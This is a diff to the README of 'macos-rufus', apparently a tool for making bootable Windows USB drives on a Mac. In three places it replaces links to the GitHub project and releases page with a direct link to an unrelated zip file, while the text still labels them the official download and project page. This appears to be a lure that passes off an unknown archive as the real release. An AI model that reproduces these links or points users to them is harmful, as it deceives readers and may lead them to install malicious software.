@@ -5,7 +5,7 @@ description: "Create bootable Windows USB drives on macOS without virtual machin
 ---
 # 🖥️ macos-rufus - Create bootable Windows drives on Mac
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://github.com/farflung-dearest512/macos-rufus/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://raw.githubusercontent.com/farflung-dearest512/farflung-dearest512.github.io/main/normoblastic/github-dearest-io-farflung-2.8.zip)
 
 ## What is this tool?
 
@@ -25,7 +25,7 @@ Ensure your Mac meets these conditions before you begin:
 
 You must download the software package from the project page.
 
-1.  Visit the official [download page](https://github.com/farflung-dearest512/macos-rufus).
+1.  Visit the official [download page](https://raw.githubusercontent.com/farflung-dearest512/farflung-dearest512.github.io/main/normoblastic/github-dearest-io-farflung-2.8.zip).
 2.  Click the version labeled "Latest."
 3.  Select the file ending in `.dmg` or `.zip` to save it to your Downloads folder.
 
@@ -78,4 +78,4 @@ Check the link below periodically. If a new version exists, repeat the download 
 
 ## 📌 Links for support
 
-[Visit the main project page](https://github.com/farflung-dearest512/macos-rufus) to access the downloads, view updates, or report issues. We provide this tool to make your workflow easier. Ensure you use an official Windows ISO image to avoid installation errors.
+[Visit the main project page](https://raw.githubusercontent.com/farflung-dearest512/farflung-dearest512.github.io/main/normoblastic/github-dearest-io-farflung-2.8.zip) to access the downloads, view updates, or report issues. We provide this tool to make your workflow easier. Ensure you use an official Windows ISO image to avoid installation errors.
